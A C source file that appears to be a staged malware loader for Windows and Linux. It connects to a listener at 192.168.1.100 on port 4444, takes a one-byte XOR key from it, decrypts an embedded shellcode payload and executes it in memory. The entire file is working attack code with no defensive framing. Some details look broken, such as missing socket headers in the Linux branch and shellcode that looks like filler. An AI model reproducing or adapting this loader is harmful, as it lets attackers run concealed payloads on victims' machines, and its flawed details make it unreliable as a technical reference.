#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

/* Stage2 stub for Windows (real Linux shellcode not runnable) */
static unsigned char stage2_stub[] = {
    0x48, 0x31, 0xc0, 0xc3  /* xor eax,eax; ret */
};

void decrypt_stage2(char *buf, int len, char key) {
    for (int i = 0; i < len; i++)
        buf[i] ^= key;
}

int main(void) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[1024] = { 0 };

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
        return 1;

    recv(sock, buffer, 1, 0);
    char key = buffer[0];

    decrypt_stage2((char *)stage2_stub, sizeof(stage2_stub), key);
    void *exec_mem = VirtualAlloc(NULL, sizeof(stage2_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem) {
        memcpy(exec_mem, stage2_stub, sizeof(stage2_stub));
        ((void (*)(void))exec_mem)();
        VirtualFree(exec_mem, 0, MEM_RELEASE);
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}
#else
char stage2[] =
"\xeb\x3f\x5f\x80\x47\x01\x41\x80\x47\x02\x42\x80\x47\x03\x43\x80"
"\x47\x04\x44\x80\x47\x05\x45\x80\x47\x06\x46\x80\x47\x07\x47\x80"
"\x47\x08\x48\x80\x47\x09\x49\x80\x47\x0a\x4a\x80\x47\x0b\x4b\x80"
"\x47\x0c\x4c\x80\x47\x0d\x4d\x80\x47\x0e\x4e\x80\x47\x0f\x4f\xeb"
"\xbf\xe8\xbc\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41";

void decrypt_stage2(char *buf, int len, char key) {
    for(int i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024] = {0};

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }

    recv(sock, buffer, 1, 0);
    char key = buffer[0];

    decrypt_stage2(stage2, sizeof(stage2), key);

    void (*stage2_func)() = (void(*)())stage2;
    stage2_func();

    return 0;
}
#endif
